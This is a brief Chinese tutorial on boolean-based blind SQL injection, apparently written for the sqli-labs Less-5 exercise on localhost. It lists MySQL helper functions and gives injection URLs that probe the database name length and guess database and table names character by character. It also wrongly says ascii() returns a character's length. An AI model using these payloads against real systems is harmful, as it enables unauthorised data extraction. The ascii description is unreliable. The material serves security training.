# 

# SQL注入—布尔盲注

![](https://pic.imgdb.cn/item/64c4e4561ddac507cc81da4d.jpg)

## 相关函数

- if(a, b, c) : 如果 a 为真，执行 b；如果 a 为假，执行 c
- mid(a, b, c) : 从字符串 a 的第 b 位起(从 1 开始算)，截取 c 个字符
- substr(a, b, c) : 从字符串 a 的第 b 位起(从 1 开始算)，截取 c 个字符
- left(a, c) : 从字符串 a 的最左边起，截取 c 个字符
- length('s') : 获取字符串 s 的长度
- ascii('c') : 获取字符 c 的长度


​	

## 判断数据库名长度

```mysql
http://127.0.0.1/sql/Less-5/index.php?id=1' and length(database())=8--+ #页面正常
```

​	

## 猜解数据库名

```mysql
http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(mid(database(),1,1))=115--+ #页面正常
```

​	

## 猜解表名

```mysql
http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+ #页面正确
```


